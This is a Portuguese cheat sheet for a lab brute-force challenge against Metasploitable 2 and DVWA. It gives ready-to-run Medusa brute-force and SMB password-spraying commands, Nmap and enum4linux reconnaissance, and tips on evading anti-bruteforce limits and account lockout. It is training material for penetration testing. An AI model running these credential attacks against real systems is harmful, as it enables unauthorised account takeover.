# 02 — Cheat sheet: Medusa, Nmap e enum4linux

> Todos os comandos assumem o laboratório do [`01-ambiente.md`](01-ambiente.md):
> **atacante** `192.168.56.102` (Kali) → **alvo** `192.168.56.101` (Metasploitable 2).

---

## 1. Medusa — sintaxe

```text
medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] \
       [-C combo] -M module [OPÇÕES]
```

### Tabela completa de flags

| Flag | Descrição |
| --- | --- |
| `-h TEXTO` | Hostname ou IP de **um** alvo |
| `-H ARQ` | Arquivo com hosts (um por linha) |
| `-u TEXTO` | Um nome de usuário |
| `-U ARQ` | Arquivo com usuários |
| `-p TEXTO` | Uma senha |
| `-P ARQ` | Arquivo com senhas |
| `-C ARQ` | Combo `host:usuario:senha` (campos vazios = usar global) |
| `-M TEXTO` | Módulo (sem `.mod`) |
| `-m TEXTO` | Parâmetro do módulo — **pode repetir** |
| `-d` | Lista os módulos disponíveis |
| `-q` | Mostra o help do módulo |
| `-e n` | Testa **sem senha** |
| `-e s` | Testa **senha = usuário** |
| `-e ns` | Ambos |
| `-n NUM` | Porta não padrão |
| `-s` | Habilita SSL/TLS |
| `-g NUM` | Timeout de conexão (s, padrão 3) |
| `-r NUM` | Espera entre retentativas (s, padrão 3) |
| `-R NUM` | Número de retentativas |
| `-c NUM` | µs de espera para validar o socket (padrão 500) |
| `-t NUM` | Logins concorrentes |
| `-T NUM` | Hosts concorrentes |
| `-L` | Paraleliza por usuário (um usuário por thread) |
| `-f` | Para o **host** após o primeiro acerto |
| `-F` | Para **tudo** após o primeiro acerto |
| `-b` | Suprime o banner |
| `-v NUM` | Verbosidade 0–6 |
| `-w NUM` | Nível de debug de erro 0–10 |
| `-V` | Versão |
| `-Z TEXTO` | Retoma varredura anterior |
| `-O ARQ` | Grava achados em log |

---

## 2. Medusa — comandos por cenário

### 2.1 FTP

```bash
# Módulos disponíveis
medusa -d | grep ftp

# Um usuário e uma senha
medusa -h 192.168.56.101 -u msfadmin -p msfadmin -M ftp

# Força bruta com listas (cenário 1 do desafio)
medusa -h 192.168.56.101 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M ftp -e ns -t 4 -c 1000 -f \
       -O logs/ftp-resultado.txt

# Testar sem senha e senha=usuario
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -M ftp -e ns -t 2

# Servidor com anti-bruteforce agressivo (vsftpd): reduzir threads e aumentar -c
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt \
       -M ftp -t 1 -c 2000 -r 5

# FTP com TLS explícito em porta alternativa
medusa -h 192.168.56.101 -n 990 -s -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp
```

### 2.2 Formulário web (DVWA)

```bash
# Reproduzir a estrutura do formulário
curl -s http://192.168.56.101/dvwa/login.php | grep -E 'form|input'

# Sintaxe do FORM-DATA: <metodo>?<campo_usuario>=&<campo_senha>=&<botao>=<valor>
# 1º campo = usuário | 2º campo = senha  (nesta ordem!)

medusa -h 192.168.56.101 \
       -u admin \
       -P wordlists/senhas.txt \
       -M web-form \
       -m FORM-DATA:"post?username=&password=&Login=Login" \
       -m DENY-SIGNAL:"Login failed" \
       -t 2 -f \
       -O logs/dvwa-resultado.txt

# Se a falha aparecer em outro texto, ajuste o DENY-SIGNAL.
# Exemplos comuns: "Login failed" | "Invalid credentials" | "Incorrect username"
```

**Erros clássicos do `web-form`:**

| Erro | Sintoma | Correção |
| --- | --- | --- |
| `DENIAL-SIGNAL` | Medusa ignora a flag, tudo vira "SUCCESS" | O nome correto é **`DENY-SIGNAL`** |
| Ordem dos campos invertida | Testa usuário no lugar da senha | 1º campo = usuário, 2º = senha |
| `action` errado | Resposta sempre 200 genérica | Copie o `action` **exato** do HTML |
| Token anti-CSRF ativo | Todas as tentativas falham | Use `scripts/dvwa_login_check.py` ou reduza o DVWA para *Low* |
| `-t` alto | Apache derruba conexões | `-t 2` |

### 2.3 SMB (password spraying)

```bash
# Sintaxe básica
medusa -h 192.168.56.101 -U wordlists/usuarios-smb.txt -p password -M smbnt -t 2

# Com domínio
medusa -h 192.168.56.101 -U wordlists/usuarios-smb.txt -p password \
       -M smbnt -m GROUP:LAB -t 2

# Rodada completa de spraying (script do repositório)
./scripts/smb_spray.sh --alvo 192.168.56.101 --confirmo-lab

# Com log por rodada
for senha in password msfadmin Senha@123; do
  medusa -h 192.168.56.101 \
         -U wordlists/usuarios-smb.txt \
         -p "$senha" \
         -M smbnt -t 2 \
         -O "logs/smb-$senha.txt"
  sleep 5       # pausa entre rodadas = a essência do spraying
done
```

### 2.4 Outros módulos úteis (fora do escopo, para estudo)

```bash
# SSH — NÃO usado aqui (porta 22 está fora do escopo do desafio)
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ssh

# MySQL
medusa -h 192.168.56.101 -U root -P wordlists/senhas.txt -M mysql

# PostgreSQL
medusa -h 192.168.56.101 -U postgres -P wordlists/senhas.txt -M postgres

# VNC (somente senha, sem usuário)
medusa -h 192.168.56.101 -P wordlists/senhas.txt -M vnc -e n

# HTTP Basic Auth
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M http
```

### 2.5 Interpretando a saída

```text
ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root ...
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: root Password: (blank) [SUCCESS]
```

| String | Significado |
| --- | --- |
| `ACCOUNT CHECK` | Tentativa em andamento (só aparece com `-v`) |
| `ACCOUNT FOUND` | **Credencial válida** |
| `[SUCCESS]` | Login aceito |
| `ALERT: ... SIGINT` | Interrompido — a linha seguinte traz o `-Z` para retomar |

---

## 3. Nmap

```bash
# Reconhecimento básico das portas do desafio
nmap -Pn -sV -p 21,80,139,445 192.168.56.101

# Detecção de SO e scripts leves
nmap -Pn -sV -O --osscan-guess -p- 192.168.56.101    # -p- é demorado; use só no início

# FTP: verifica login anônimo
nmap -Pn -p 21 --script ftp-anon 192.168.56.101

# FTP: banner e capacidades (FEAT)
nmap -Pn -p 21 --script "ftp-syst,ftp-features" 192.168.56.101

# SMB: shares, usuários, políticas
nmap -Pn -p 139,445 --script "smb-enum-shares,smb-enum-users" 192.168.56.101
nmap -Pn -p 139,445 --script "smb-os-discovery,smb-security-mode" 192.168.56.101
nmap -Pn -p 445 --script "smb-vuln-*" 192.168.56.101

# HTTP: título, métodos e diretórios comuns
nmap -Pn -p 80 --script "http-title,http-methods" 192.168.56.101
nmap -Pn -p 80 --script http-enum 192.168.56.101

# Saída em todos os formatos (bom para documentar)
nmap -Pn -sV -p 21,80,139,445 -oA logs/nmap-inicial 192.168.56.101
```

### Interpretando o resultado

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

> 💡 `vsftpd 2.3.4` tem um **backdoor conhecido** (CVE-2011-2523). Em um
> laboratório, vale notar: a versão em si é a vulnerabilidade. Atualizar o
> software teria eliminado o risco sem depender de senha forte.

---

## 4. enum4linux

Ferramenta de enumeração SMB que embrulha `smbclient`, `nmblookup`, `rpcclient`
e `net`.

```bash
# Enumeração completa (recomendado na primeira vez)
enum4linux -a 192.168.56.101

# Só usuários — formato pronto para wordlist
enum4linux -U 192.168.56.101
enum4linux -U 192.168.56.101 | grep 'user:\[' | sed -E 's/.*user:\[([^]]+)\].*/\1/' > wordlists/usuarios-enumerados.txt

# Só shares
enum4linux -S 192.168.56.101

# Política de senha (min length, lockout threshold, duração)
enum4linux -P 192.168.56.101

# Grupos e membros
enum4linux -G 192.168.56.101

# Com credencial válida (enumeração autenticada traz muito mais)
enum4linux -a -u msfadmin -p msfadmin 192.168.56.101
```

### O que cada seção entrega

| Seção | Informação | Uso no ataque |
| --- | --- | --- |
| `Target Information` | OS, NetBIOS, domínio | Contexto |
| `Users on ...` | **Lista de usuários válidos** | Substitui/enriquece a wordlist |
| `Share Enumeration` | Shares e permissões | Alvo de acesso |
| `Password Policy Information` | `Minimum password length`, `Lockout Threshold` | **Decide se o spraying vai travar contas** |
| `Groups` | Grupos e membros | Identifica contas privilegiadas |

> 🎯 O campo `Lockout Threshold` é o mais importante para o spraying:
> **0 = sem bloqueio** (spraying livre). Se for `3`, você tem no máximo 2
> tentativas por conta antes de travar — e deve espaçar muito mais.

---

## 5. Validação das credenciais (pós-ataque)

```bash
# FTP
ftp 192.168.56.101               # digitando usuário/senha
curl -s --user msfadmin:msfadmin ftp://192.168.56.101/ --list-only

# SMB
smbclient -L //192.168.56.101 -N                          # sem credencial
smbclient -L //192.168.56.101 -U msfadmin%msfadmin        # com credencial
smbclient //192.168.56.101/tmp -U msfadmin%msfadmin       # acessar share
#   smb: \> ls
#   smb: \> get arquivo.txt
#   smb: \> put local.txt            (testar escrita)

# rpcclient (com credencial)
rpcclient -U msfadmin%msfadmin 192.168.56.101 -c 'enumdomusers'

# Web / DVWA
curl -s -c cookies.txt http://192.168.56.101/dvwa/login.php | grep -o 'user_token.*'
python3 scripts/dvwa_login_check.py --url http://192.168.56.101/dvwa \
        --usuario admin --senha password --confirmo-lab
```

---

## 6. Comandos de apoio

```bash
# Versões
medusa -V ; nmap --version | head -1 ; enum4linux 2>&1 | head -1

# Módulos do Medusa em lista limpa
medusa -d | grep -oE '[a-z0-9-]+\.mod' | sed 's/\.mod//' | sort -u

# Ajuda de um módulo específico
medusa -M web-form -q

# Verificação de sintaxe dos scripts do repositório
bash -n scripts/*.sh
python3 -m py_compile scripts/dvwa_login_check.py

# Preflight completo
./scripts/preflight_lab.sh --alvo 192.168.56.101 --confirmo-lab -v
```

---

## 7. Referência rápida: qual flag resolver qual problema

| Problema | Flag |
| --- | --- |
| "Connection refused" no meio do ataque (FTP/vsftpd) | `-c 1000` |
| Alvo para de responder com muitas threads | `-t 1` ou `-t 2`, `-r 5` |
| Quero parar no primeiro acerto | `-f` (host) ou `-F` (tudo) |
| Quero salvar as credenciais achadas | `-O logs/resultado.txt` |
| Ataque interrompido, quero retomar | `-Z <mapa>` (o Medusa imprime o mapa) |
| Testar conta sem senha | `-e n` |
| Testar senha igual ao usuário | `-e s` |
| Serviço em porta não padrão | `-n <porta>` |
| HTTPS | `-s` |
| Deixar a saída limpa em scripts | `-b` |
